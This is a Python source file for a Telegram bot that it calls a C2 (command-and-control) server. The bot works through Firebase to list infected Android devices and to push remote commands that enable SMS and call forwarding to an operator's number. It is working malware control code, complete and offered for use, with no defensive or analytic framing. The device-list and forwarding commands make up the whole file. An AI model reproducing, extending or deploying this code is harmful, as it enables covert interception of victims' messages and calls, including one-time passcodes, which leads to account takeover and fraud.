#!/usr/bin/env python3
"""
Telegram C2 bot — replaces the web panel.
Same Firebase command-and-sync architecture:
  bot  →  writes config/  →  Firebase  →  app reads  →  acts  →  writes status/
"""

import json, os, time, logging, requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler,
    MessageHandler, filters, ContextTypes
)

# ─── CONFIG ────────────────────────────────────────────────────────────────
BOT_TOKEN   = os.environ.get("BOT_TOKEN", "PUT_TELEGRAM_BOT_TOKEN")
FIREBASE_URL = os.environ.get("FIREBASE_URL", "https://your-proj.firebaseio.com").rstrip("/")
DB_SECRET   = os.environ.get("DB_SECRET", "")   # optional, empty if rules open
STATE_FILE  = "operator_state.json"
# ───────────────────────────────────────────────────────────────────────────

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger("c2bot")

# ─── Firebase REST helpers ─────────────────────────────────────────────────
def _auth():
    return {"auth": DB_SECRET} if DB_SECRET else {}

def _url(path):
    return f"{FIREBASE_URL}/{path.strip('/')}.json"

def fb_get(path):
    r = requests.get(_url(path), params=_auth(), timeout=15); r.raise_for_status()
    return r.json()

def fb_put(path, data):
    r = requests.put(_url(path), json=data, params=_auth(), timeout=15); r.raise_for_status()
    return r.json()

def fb_patch(path, data):
    r = requests.patch(_url(path), json=data, params=_auth(), timeout=15); r.raise_for_status()
    return r.json()

# ─── Operator state (which device each chat has selected) ──────────────────
def load_state():
    return json.load(open(STATE_FILE)) if os.path.exists(STATE_FILE) else {}
def save_state(s):
    json.dump(s, open(STATE_FILE, "w"), indent=2)
STATE = load_state()

def get_selected(chat_id: int):
    return STATE.get(str(chat_id), {}).get("device_id")

def set_selected(chat_id: int, device_id: str):
    STATE.setdefault(str(chat_id), {})["device_id"] = device_id
    save_state(STATE)

# ─── Command handlers ──────────────────────────────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "C2 online.\n\n"
        "/devices — list registered devices\n"
        "/select <device_id> — pick active device\n"
        "/status — show active device config + status\n"
        "/smsfwd <number> — enable SMS forwarding\n"
        "/smsfwd_off — disable SMS forwarding\n"
        "/callfwd <number> [unconditional|busy|no_answer|unreachable]\n"
        "/callfwd_off — disable call forwarding"
    )

async def cmd_devices(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    devices = fb_get("devices") or {}
    if not devices:
        await update.message.reply_text("No devices registered yet.")
        return
    lines, kb = [], []
    for did, node in devices.items():
        info = (node or {}).get("info", {}) or {}
        seen = info.get("last_seen", 0)
        age  = int(time.time() - seen) if seen else 999999
        dot  = "🟢" if age < 120 else ("🟡" if age < 900 else "🔴")
        lines.append(f"{dot} `{did}` — {info.get('model','?')} / Android {info.get('android','?')} / {info.get('operator','?')} ({age}s ago)")
        kb.append([InlineKeyboardButton(f"{info.get('model','?')} · {did[:8]}", callback_data=f"sel:{did}")])
    await update.message.reply_text(
        "*Devices*\n" + "\n".join(lines),
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(kb)
    )

async def on_select_button(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    did = q.data.split(":", 1)[1]
    set_selected(q.message.chat_id, did)
    await q.edit_message_text(f"Active device → `{did}`", parse_mode="Markdown")

async def cmd_select(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if len(ctx.args) != 1:
        await update.message.reply_text("usage: /select <device_id>"); return
    set_selected(update.effective_chat.id, ctx.args[0])
    await update.message.reply_text(f"Active device → `{ctx.args[0]}`", parse_mode="Markdown")

async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    did = get_selected(update.effective_chat.id)
    if not did:
        await update.message.reply_text("No device selected. /devices"); return
    cfg = fb_get(f"devices/{did}/config") or {}
    st  = fb_get(f"devices/{did}/status") or {}
    info = fb_get(f"devices/{did}/info") or {}
    text = (
        f"*Device* `{did}`\n"
        f"{info.get('model','?')} · Android {info.get('android','?')} · {info.get('operator','?')}\n\n"
        f"*Config*\n"
        f"SMS fwd:  {cfg.get('sms_forwarding', False)} → {cfg.get('sms_forward_to','-')}\n"
        f"Call fwd: {cfg.get('call_forwarding', False)} → {cfg.get('call_forward_to','-')} ({cfg.get('call_type','-')})\n\n"
        f"*Status*\n"
        f"SMS active:  {st.get('sms_active', False)}\n"
        f"Call active: {st.get('call_active', False)}\n"
        f"Last fwd:    {st.get('last_forwarded','-')}\n"
        f"USSD reply:  {st.get('ussd_response','-')}"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

async def cmd_smsfwd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    did = get_selected(update.effective_chat.id)
    if not did:  await update.message.reply_text("No device selected."); return
    if len(ctx.args) != 1:
        await update.message.reply_text("usage: /smsfwd <+number>"); return
    number = ctx.args[0]
    fb_patch(f"devices/{did}/config", {
        "sms_forwarding": True,
        "sms_forward_to": number,
        "updated_at": int(time.time())
    })
    await update.message.reply_text(f"SMS forwarding → `{number}` pushed.", parse_mode="Markdown")

async def cmd_smsfwd_off(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    did = get_selected(update.effective_chat.id)
    if not did:  await update.message.reply_text("No device selected."); return
    fb_patch(f"devices/{did}/config", {"sms_forwarding": False, "updated_at": int(time.time())})
    await update.message.reply_text("SMS forwarding disabled.")

async def cmd_callfwd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    did = get_selected(update.effective_chat.id)
    if not did:  await update.message.reply_text("No device selected."); return
    if len(ctx.args) < 1:
        await update.message.reply_text("usage: /callfwd <+number> [unconditional|busy|no_answer|unreachable]"); return
    number = ctx.args[0]
    ctype  = ctx.args[1] if len(ctx.args) > 1 else "unconditional"
    if ctype not in ("unconditional", "busy", "no_answer", "unreachable"):
        await update.message.reply_text("type must be one of: unconditional|busy|no_answer|unreachable"); return
    fb_patch(f"devices/{did}/config", {
        "call_forwarding": True,
        "call_forward_to": number,
        "call_type":       ctype,
        "updated_at":      int(time.time())
    })
    await update.message.reply_text(f"Call forwarding ({ctype}) → `{number}` pushed.", parse_mode="Markdown")

async def cmd_callfwd_off(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    did = get_selected(update.effective_chat.id)
    if not did:  await update.message.reply_text("No device selected."); return
    fb_patch(f"devices/{did}/config", {"call_forwarding": False, "updated_at": int(time.time())})
    await update.message.reply_text("Call forwarding disabled.")

async def cmd_any(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Unknown command. /start")

# ─── Main ──────────────────────────────────────────────────────────────────
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("devices", cmd_devices))
    app.add_handler(CommandHandler("select", cmd_select))
    app.add_handler(CommandHandler("status", cmd_status))
    app.add_handler(CommandHandler("smsfwd", cmd_smsfwd))
    app.add_handler(CommandHandler("smsfwd_off", cmd_smsfwd_off))
    app.add_handler(CommandHandler("callfwd", cmd_callfwd))
    app.add_handler(CommandHandler("callfwd_off", cmd_callfwd_off))
    app.add_handler(CallbackQueryHandler(on_select_button, pattern=r"^sel:"))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, cmd_any))
    log.info("C2 bot online.")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()